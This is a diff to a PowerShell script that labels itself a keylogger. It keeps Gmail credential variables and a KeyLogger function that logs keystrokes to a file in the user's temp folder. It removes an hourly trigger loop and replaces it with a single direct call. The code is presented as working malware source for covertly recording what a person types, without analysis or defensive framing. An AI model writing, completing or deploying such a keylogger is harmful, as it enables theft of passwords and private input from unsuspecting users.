@@ -1,37 +1,9 @@
+# powershell keylogger
+# created by : C0SM0
+
 # gmail credentials
 $email = "example@gmail.com"
 $password = "password"
-
-# Specify the Execution times
-$TriggerTimes = @(
-    '12:00:00am',
-    '1:00:00am',
-    '2:00:00am',
-    '3:00:00am',
-    '4:00:00am',
-    '5:00:00am',
-    '6:00:00am',
-    '7:00:00am',
-    '8:00:00am',
-    '9:00:00am',
-    '10:00:00am',
-    '11:00:00am',
-    '12:00:00pm',
-    '1:00:00pm',
-    '2:00:00pm',
-    '3:00:00pm',
-    '4:00:00pm',
-    '5:00:00pm',
-    '6:00:00pm',
-    '7:00:00pm',
-    '8:00:00pm',
-    '9:00:00pm',
-    '10:00:00pm',
-    '11:00:00pm'
-)
-
-# sort the times in chronological order
-$TriggerTimes = $TriggerTimes | Sort-Object
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
@@ -101,30 +73,5 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
 }
 
-# ensure keylogger runs every day
-while ($true) {
-
-    # run keylogger for each trigger time
-    foreach ($t in $TriggerTimes)
-    {
-        # Past time 
-        if((Get-Date) -lt (Get-Date -Date $t))
-        {
-            # Sleeping
-            while ((Get-Date -Date $t) -gt (Get-Date))
-            {
-              # Sleep for the remaining time
-              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
-            }
-
-            #  runs keylogger
-            KeyLogger
-        }
-
-        # runs keylogger if time already passed 
-        # ensures logger is run immediately
-        else{
-          KeyLogger
-        }
-    }
-}
+# run keylogger
+KeyLogger
